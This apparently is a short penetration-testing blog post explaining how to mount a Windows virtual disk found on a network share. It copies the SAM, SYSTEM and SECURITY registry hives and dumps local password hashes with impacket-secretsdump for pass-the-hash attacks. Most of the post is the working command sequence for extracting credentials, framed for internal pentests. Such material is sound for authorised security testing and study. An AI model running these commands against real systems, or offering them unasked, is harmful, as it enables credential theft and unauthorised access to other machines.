---
published: true
title: Extract SAM Hashes from VMDK File
---

On your internal pentest you managed to find a Windows vm while searching network shares as a low privilged user. If you can extract the SAM hashes from the virtual machine, you may be able to pass the hash and gain local admin access to some systems.

```
sudo apt-get install libguestfs-tools
sudo mkdir /mnt/Win7
sudo guestmount -i -r /mnt/Win7 -a ./Windows\ 7-0.vmdk
sudo cp /mnt/Win7/Windows/System32/config/SAM .
sudo cp /mnt/Win7/Windows/System32/config/SYSTEM .
sudo cp /mnt/Win7/Windows/System32/config/SECURITY .
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
sudo guestunmount /mnt/Win7
```

If guestmount gives you a lot of output, you're probably mounting a split disk and you've chosen the wrong vmdk. In this case, the first was named “Windows 7.vmdk”, the second disk was “Windows 7-0.vmdk”.
